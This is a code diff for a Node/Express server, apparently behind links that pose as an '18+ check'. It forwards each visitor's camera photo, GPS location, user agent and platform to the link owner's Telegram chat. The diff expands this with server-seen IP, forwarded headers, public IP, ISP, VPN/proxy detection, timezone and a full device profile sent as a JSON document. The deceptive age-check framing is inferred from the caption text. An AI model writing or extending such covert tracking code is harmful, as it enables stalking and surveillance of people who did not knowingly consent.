@@ -5,6 +5,8 @@ import path from 'path';
 import fs from 'fs';
 import Database from 'better-sqlite3';
 import { fileURLToPath } from 'url';
+// NEW: FormData/Blob из undici для совместимости (Node 18+ уже ок, но так надёжнее)
+import { FormData, Blob } from 'undici';
 
 // ==== ENV ====
 const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
@@ -95,6 +97,23 @@ function b64ToBuffer(dataUrl = '') {
   const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
   return Buffer.from(b64, 'base64');
 }
+
+// NEW: безопасный разбор клиентского IP/заголовков
+function extractClientIp(req) {
+  const xff = (req.headers['x-forwarded-for'] || '').toString();
+  const chain = xff.split(',').map(s => s.trim()).filter(Boolean);
+  // первый из списка — исходный клиент (за CDN/прокси)
+  const ip = chain[0] || req.headers['cf-connecting-ip'] || req.ip || req.socket?.remoteAddress || null;
+  return String(ip || '').replace(/^::ffff:/, '') || null;
+}
+function pickHeader(req, name) {
+  const v = req.headers[name];
+  if (!v) return null;
+  if (Array.isArray(v)) return v[0];
+  return String(v);
+}
+
+// NEW: Telegram helpers
 async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
   if (!BOT_TOKEN) throw new Error('No BOT token on server');
   if (!chatId) throw new Error('Missing chat_id');
@@ -115,6 +134,22 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   return resp.json();
 }
 
+// NEW: шлём JSON как документ (удобно для больших профилей)
+async function sendJsonDocumentToTelegram({ chatId, filename, jsonObject }) {
+  if (!BOT_TOKEN) throw new Error('No BOT token on server');
+  const form = new FormData();
+  form.append('chat_id', String(chatId));
+  const jsonStr = JSON.stringify(jsonObject, null, 2);
+  form.append('document', new Blob([jsonStr], { type: 'application/json' }), filename || 'details.json');
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+  const resp = await fetch(url, { method: 'POST', body: form });
+  if (!resp.ok) {
+    const text = await resp.text().catch(() => '');
+    throw new Error(`Telegram ${resp.status}: ${text}`);
+  }
+  return resp.json();
+}
+
 // ==== health & debug ====
 app.get('/health', (_req, res) => res.json({ ok: true }));
 app.get('/api/debug/db', (req, res) => {
@@ -122,6 +157,31 @@ app.get('/api/debug/db', (req, res) => {
     const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
     const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
     res.json({ ok:true, DB_PATH, size, codes });
+  } catch (e) {
+    res.status(500).json({ ok:false, error:String(e) });
+  }
+});
+
+// NEW: API client-ip (для фронта)
+app.get('/api/client-ip', (req, res) => {
+  try {
+    const ip    = extractClientIp(req);
+    const cf    = {
+      country: pickHeader(req,'cf-ipcountry'),
+      colo: pickHeader(req,'cf-ray')?.split('-')[1] || null,
+      city: pickHeader(req,'cf-ipcity') || null, // проксируются не всегда
+      asn: pickHeader(req,'cf-asn') || null
+    };
+    // ISP/ORG можно пробрасывать с CDN/edge, если настроить. По умолчанию null.
+    const out = {
+      ip,
+      country: cf.country || null,
+      region: null,
+      isp: null,
+      edge: cf.colo || null,
+      asn: cf.asn || null
+    };
+    res.json(out);
   } catch (e) {
     res.status(500).json({ ok:false, error:String(e) });
   }
@@ -161,7 +221,14 @@ app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
 // ==== API: report (отправка фото владельцу кода) ====
 app.post('/api/report', async (req, res) => {
   try {
-    const { userAgent, platform, iosVersion, isSafari, geo, photoBase64, note, code } = req.body || {};
+    // FRONT теперь присылает: userAgent, platform, iosVersion, isSafari, geo, photoBase64, note, code,
+    // а также device_check и client_profile (см. app.js)
+    const {
+      userAgent, platform, iosVersion, isSafari,
+      geo, photoBase64, note, code,
+      device_check, client_profile
+    } = req.body || {};
+
     if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
     if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });
 
@@ -169,23 +236,80 @@ app.post('/api/report', async (req, res) => {
       .get(String(code).toUpperCase());
     if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
 
-    const caption = [
+    // Серверные метаданные
+    const ip     = extractClientIp(req);
+    const ua     = String(userAgent || '');
+    const plat   = String(platform || '');
+    const safari = String(isSafari);
+    const iosStr = (iosVersion ?? '') + '';
+    const tz     = client_profile?.timezone || null;
+    const pubIp  = client_profile?.publicIp?.ip || null;
+    const pubCC  = client_profile?.publicIp?.country || null;
+    const isp    = client_profile?.publicIp?.isp || null;
+    const vpnLbl = client_profile?.vpnProxy?.label || null;
+
+    // Компактная подпись для фото (всё остальное — JSON документом)
+    const lines = [
       '<b>Новый отчёт 18+ проверка</b>',
       `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
-      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
-      `Platform: <code>${escapeHTML(platform || '')}</code>`,
-      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
+      `UA: <code>${escapeHTML(ua)}</code>`,
+      `Platform: <code>${escapeHTML(plat)}</code>`,
+      `iOS-like: <code>${escapeHTML(iosStr)}</code>  Safari: <code>${escapeHTML(safari)}</code>`,
       geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
+      ip ? `ServerIP: <code>${escapeHTML(ip)}</code>` : null,
+      pubIp ? `PublicIP: <code>${escapeHTML(pubIp)}${pubCC ? ' ('+escapeHTML(pubCC)+')' : ''}${isp ? ', '+escapeHTML(isp) : ''}</code>` : null,
+      vpnLbl ? `VPN/Proxy: <code>${escapeHTML(vpnLbl)}</code>` : null,
+      tz ? `TZ: <code>${escapeHTML(tz)}</code>` : null,
       note ? `Note: <code>${escapeHTML(note)}</code>` : null
-    ].filter(Boolean).join('\n');
+    ].filter(Boolean);
+
+    // обрезаем если вдруг многовато (Telegram лимит ~1024-4096 символов)
+    const caption = lines.join('\n').slice(0, 3500);
 
     const buf = b64ToBuffer(photoBase64);
-    const tg = await sendPhotoToTelegram({
+    const sentPhoto = await sendPhotoToTelegram({
       chatId: String(row.chat_id),
       caption,
       photoBuf: buf
     });
-    res.json({ ok: true, sent: [{ chatId: String(row.chat_id), ok: true, message_id: tg?.result?.message_id }] });
+
+    // Отдельно отправляем JSON с деталями (device_check + client_profile + server_seen)
+    const details = {
+      received_at: Date.now(),
+      server_seen: {
+        ip,
+        headers: {
+          'user-agent': pickHeader(req,'user-agent'),
+          'cf-connecting-ip': pickHeader(req,'cf-connecting-ip'),
+          'x-forwarded-for': pickHeader(req,'x-forwarded-for'),
+          'cf-ipcountry': pickHeader(req,'cf-ipcountry'),
+          'cf-ray': pickHeader(req,'cf-ray')
+        },
+        url: req.originalUrl
+      },
+      device_check: device_check || null,
+      client_profile: client_profile || null,
+      front_summary: { userAgent, platform, iosVersion, isSafari, geo, note, code }
+    };
+
+    let sentDoc = null;
+    try {
+      sentDoc = await sendJsonDocumentToTelegram({
+        chatId: String(row.chat_id),
+        filename: `report_${String(code).toUpperCase()}_${Date.now()}.json`,
+        jsonObject: details
+      });
+    } catch (e) {
+      console.warn('[report] sendDocument failed:', e?.message || e);
+    }
+
+    res.json({
+      ok: true,
+      sent: [
+        { chatId: String(row.chat_id), ok: true, type: 'photo', message_id: sentPhoto?.result?.message_id || null },
+        { chatId: String(row.chat_id), ok: !!sentDoc, type: 'document', message_id: sentDoc?.result?.message_id || null }
+      ]
+    });
   } catch (e) {
     console.error('[report] error:', e);
     res.status(500).json({ ok: false, error: e.message || 'Internal error' });
